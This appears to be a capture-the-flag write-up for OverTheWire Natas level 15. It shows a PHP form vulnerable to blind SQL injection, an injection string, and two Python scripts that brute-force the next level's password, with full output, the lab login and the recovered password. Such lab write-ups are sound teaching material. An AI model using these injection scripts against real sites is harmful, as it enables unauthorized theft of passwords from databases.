+++
author = "Alex Domnit"
title = 'Natas-Level 15'
date = 2024-08-23T15:10:52+03:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Natas",
]

toc = false
+++

### Login
*Username: natas15*\
*Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx*\
*URL:      http://natas15.natas.labs.overthewire.org*

### Doc
[What is SQL?](https://en.wikipedia.org/wiki/SQL)\
Structured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables. 
[What is SQL injection?](https://en.wikipedia.org/wiki/SQL_injection)\
In computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.\
[What is brute-forcing?](https://en.wikipedia.org/wiki/Brute-force_attack)\
In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\
[What is python?](https://en.wikipedia.org/wiki/Python_(programming_language))\
Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.

### Solution
Let`s log into natas15. Now the only present field is one entitled **username** and a **check existance** send button.

<img src="/img/natas/natas15-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
<strong>Source code:</strong>

{{< highlight html >}}
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
{{< /highlight >}}
#### What does this code do?
The important selection out of all of that code is this: 
```
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }
```
This code snippet submits the sent data from the <strong>natas15 index page</strong> and parses it into a SQL query that boils down to:
```
Select * FROM users WHERE username="sentData"
```
Easy, basic <strong>SQL injection</strong> just like the last time right? Welp, not so soon since this time, there is no output except for an existance confirmation, a "does not exist return" and a sql querry error statement. So now that we know that we can`t output anything, what are we supposed to do?\
The 3 type of returns are actually very usefull since you can send data packets and get confirmation about the packets. The approach idea is to try every possible combination tailored with what we know that the output should be and how it should look and watch out for validation.
#### In practice, how can it be done?
The SQL injection statement will look like this:
```
natas16" AND password LIKE BINARY "%letter%" "
```
This will produce a positive output when the password associated with <strong>natas16</strong> contains a letter given by us (or in this case also an uppercase letter and numbers) and we will produce a string composed of all the letters present in the actual password. We should write a script in order to achieve this since doing that by hand is not possible.\
<strong>Python script template:</strong>
```
import requests

target = 'http://natas15.natas.labs.overthewire.org'
possibleCharacterList = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
foundCharacterList = ''

for character in possibleCharacterList:
	username = ('natas16" AND password LIKE BINARY "%' + character +'%" "') #BINARY is used to make the search case sensitive
	req = requests.get(target,
		auth=('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),
		params={"username": username}
	)
	if "This user exists" in req.text:
		foundCharacterList += character
		print ('Possible so far: ' + foundCharacterList)
print("----"+"end of search"+"----")
```
We use the <strong>request</strong> library in order to make requests and get responses from the service then define our SQL query, define our auth parameters (<strong>the login data you have for natas15</strong>) and if the response to our insert with a certain character is possitive, append it to the empty list.\
<strong>Script execution:</strong>
```
03:13:59 archie@Archie pyscript → python3 getpasswordletters.py
Possible so far: 3
Possible so far: 34
Possible so far: 346
Possible so far: 346c
Possible so far: 346ce
Possible so far: 346cef
Possible so far: 346cefh
Possible so far: 346cefhi
Possible so far: 346cefhij
Possible so far: 346cefhijk
Possible so far: 346cefhijkm
Possible so far: 346cefhijkmo
Possible so far: 346cefhijkmos
Possible so far: 346cefhijkmost
Possible so far: 346cefhijkmostu
Possible so far: 346cefhijkmostuv
Possible so far: 346cefhijkmostuvD
Possible so far: 346cefhijkmostuvDE
Possible so far: 346cefhijkmostuvDEG
Possible so far: 346cefhijkmostuvDEGK
Possible so far: 346cefhijkmostuvDEGKL
Possible so far: 346cefhijkmostuvDEGKLM
Possible so far: 346cefhijkmostuvDEGKLMP
Possible so far: 346cefhijkmostuvDEGKLMPQ
Possible so far: 346cefhijkmostuvDEGKLMPQV
Possible so far: 346cefhijkmostuvDEGKLMPQVW
Possible so far: 346cefhijkmostuvDEGKLMPQVWX
Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
----end of search----
Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
```
As you can see, we confirmed that the password is composed out of these characters : <strong>346cefhijkmostuvDEGKLMPQVWXY</strong>
#### What`s next?
Okay, so we have our string of present characters in the password but that is not the passkey for the next level. The approach will now be, for character in string, if password is like characterinstring% append to characterinstring and continue until the password reaches the length of 32 (<strong>all the password\`s lenghts so far</strong>) and then break.\
For that I will make a function that takes the output of the last script and does what I\`ve described ealier for each letter in the input.\
<strong>Function:</strong>
```
def get_password(foundCharacterList):
    password = ''
    while len(password)!=32:
        for character in foundCharacterList:
            username = ('natas16" AND password LIKE BINARY "' + password + character + '%" "')
            req = requests.get(target,
                auth=('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),
                params={"username": username}
            )
            if "This user exists" in req.text:
                password += character
                print ('Password so far: ' + password)
                break
    print("Final password: " + password)
```
<strong>Now let`s run this:</strong>
```
03:32:35 archie@Archie pyscript → python3 finalscript.py
Possible so far: 3
Possible so far: 34
Possible so far: 346
Possible so far: 346c
Possible so far: 346ce
Possible so far: 346cef
Possible so far: 346cefh
Possible so far: 346cefhi
Possible so far: 346cefhij
Possible so far: 346cefhijk
Possible so far: 346cefhijkm
Possible so far: 346cefhijkmo
Possible so far: 346cefhijkmos
Possible so far: 346cefhijkmost
Possible so far: 346cefhijkmostu
Possible so far: 346cefhijkmostuv
Possible so far: 346cefhijkmostuvD
Possible so far: 346cefhijkmostuvDE
Possible so far: 346cefhijkmostuvDEG
Possible so far: 346cefhijkmostuvDEGK
Possible so far: 346cefhijkmostuvDEGKL
Possible so far: 346cefhijkmostuvDEGKLM
Possible so far: 346cefhijkmostuvDEGKLMP
Possible so far: 346cefhijkmostuvDEGKLMPQ
Possible so far: 346cefhijkmostuvDEGKLMPQV
Possible so far: 346cefhijkmostuvDEGKLMPQVW
Possible so far: 346cefhijkmostuvDEGKLMPQVWX
Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
----end of search----
Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
Password so far: h
Password so far: hP
Password so far: hPk
Password so far: hPkj
Password so far: hPkjK
Password so far: hPkjKY
Password so far: hPkjKYv
Password so far: hPkjKYvi
Password so far: hPkjKYviL
Password so far: hPkjKYviLQ
Password so far: hPkjKYviLQc
Password so far: hPkjKYviLQct
Password so far: hPkjKYviLQctE
Password so far: hPkjKYviLQctEW
Password so far: hPkjKYviLQctEW3
Password so far: hPkjKYviLQctEW33
Password so far: hPkjKYviLQctEW33Q
Password so far: hPkjKYviLQctEW33Qm
Password so far: hPkjKYviLQctEW33Qmu
Password so far: hPkjKYviLQctEW33QmuX
Password so far: hPkjKYviLQctEW33QmuXL
Password so far: hPkjKYviLQctEW33QmuXL6
Password so far: hPkjKYviLQctEW33QmuXL6e
Password so far: hPkjKYviLQctEW33QmuXL6eD
Password so far: hPkjKYviLQctEW33QmuXL6eDV
Password so far: hPkjKYviLQctEW33QmuXL6eDVf
Password so far: hPkjKYviLQctEW33QmuXL6eDVfM
Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
As you can see, we`ve got the password for the next level : <strong>hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</strong>